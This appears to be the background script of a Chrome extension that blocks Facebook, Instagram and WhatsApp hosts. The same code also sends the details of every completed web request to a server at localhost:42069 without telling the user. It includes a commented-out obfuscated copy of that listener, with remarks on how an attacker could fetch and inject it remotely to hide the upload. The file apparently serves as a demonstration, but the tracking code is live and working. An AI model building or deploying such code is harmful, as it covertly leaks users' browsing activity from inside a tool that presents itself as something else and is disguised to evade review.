///<reference path="../../../.WebStorm2019.1/config/javascript/extLibs/global-types/node_modules/@types/chrome/index.d.ts"/>
///<reference path="./shared.ts"/>
var filter = {urls: ["<all_urls>"]};
var myServerAddress = "http://localhost:42069/";
// On installation, initialize chrome sync variables
chrome.runtime.onInstalled.addListener((function (details) {
    chrome.storage.sync.get({facebookSwitch: true, instagramSwitch: true, whatsappSwitch: true}, function (items) {
        return chrome.storage.sync.set(items);
    });
}));
var blockingFacebook = true;
var blockingInstagram = true;
var blockingWhatsapp = true;
chrome.storage.sync.get({facebookSwitch: true, instagramSwitch: true, whatsappSwitch: true}, function (items) {
    blockingFacebook = items["facebookSwitch"];
    blockingInstagram = items["instagramSwitch"];
    blockingWhatsapp = items["whatsappSwitch"];
});
var facebookHosts = [];
var facebookHostsFilePath = chrome.runtime.getURL("lists/facebook.txt");
fetch(facebookHostsFilePath).then(function (response) {
    return response.text().then(function (text) {
        facebookHosts = text.split("\n");
        facebookHosts.forEach(function (it, index) {
            return facebookHosts[index] = it.trim();
        });
    });
});
var instagramHosts = [];
var instagramHostsFilePath = chrome.runtime.getURL("lists/instagram.txt");
fetch(instagramHostsFilePath).then(function (response) {
    return response.text().then(function (text) {
        instagramHosts = text.split("\n");
        instagramHosts.forEach(function (it, index) {
            return instagramHosts[index] = it.trim();
        });
    });
});
var whatsappHosts = [];
var whatsappHostsFilePath = chrome.runtime.getURL("lists/whatsapp.txt");
fetch(whatsappHostsFilePath).then(function (response) {
    return response.text().then(function (text) {
        whatsappHosts = text.split("\n");
        whatsappHosts.forEach(function (it, index) {
            return whatsappHosts[index] = it.trim();
        });
    });
});
function now() {
    return Date().toString();
}
function sendDataToServer(data) {
    data["time"] = now();
    var sent = {data: JSON.stringify(data, null, "  ")};
    console.log(sent.data);
    fetch(myServerAddress, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(sent)
    });
}

// When settings have changed, the popup will send us a message telling us what changed
chrome.runtime.onMessage.addListener(function (message) {
    var whatChanged = message["whatChanged"];
    if (!!whatChanged) {
        chrome.storage.sync.get(whatChanged, function (items) {
            if (whatChanged === "facebookSwitch")
                blockingFacebook = items[whatChanged];
            else if (whatChanged === "instagramSwitch")
                blockingInstagram = items[whatChanged];
            else if (whatChanged === "whatsappSwitch")
                blockingWhatsapp = items[whatChanged];
        });
    }
});
// Block the sites we need to block
chrome.webRequest.onBeforeRequest.addListener(function (details) {
    if (details.url !== myServerAddress) {
        var url = new URL(details.url);
        if (blockingFacebook && facebookHosts.contains(url.hostnameClean()))
            return {cancel: true};
        if (blockingInstagram && instagramHosts.contains(url.hostnameClean()))
            return {cancel: true};
        if (blockingWhatsapp && whatsappHosts.contains(url.hostnameClean()))
            return {cancel: true};
    }
}, filter, ["requestBody", "blocking"]);
// On request completed notify the remote server
chrome.webRequest.onCompleted.addListener(function (details) {
    if (details.url !== myServerAddress) {
        sendDataToServer(details);
    }
}, filter, ["responseHeaders"]);
// Below is an obfuscated version of the above onCompleted listener
// we can even store this on a server somewhere and fetch it and inject it here (or make it self injecting) to
// further hide the POST request sent to our server, JS allows for a lot of funky magic like this that an attacker
// can use to hide their actions from interested actors
/*const a = ['onCompleted', 'responseHeaders', 'POST', 'log', 'body', 'stringify', 'time', 'Content-Type', 'addListener', 'url', 'webRequest', 'data', 'application/json', 'headers'];
(function (b, e) {
    const f = function (g) {
        while (--g) {
            b['push'](b['shift']());
        }
    };
    f(++e);
}(a, 0xaa));
const b = function (c, d) {
    c = c - 0x0;
    let e = a[c];
    return e;
};
chrome[b('0x8')][b('0xc')][b('0x6')](f => {
    if (f[b('0x7')] !== myServerAddress) {
        f[b('0x4')] = now();
        const g = {};
        g[b('0x9')] = JSON[b('0x3')](f, null, '\x20\x20');
        let h = g;
        console[b('0x1')](h[b('0x9')]);
        const i = {};
        i[b('0x5')] = b('0xa');
        const j = {};
        j['method'] = b('0x0');
        j[b('0xb')] = i;
        j[b('0x2')] = JSON['stringify'](h);
        fetch(myServerAddress, j);
    }
}, filter, [b('0xd')]);*/
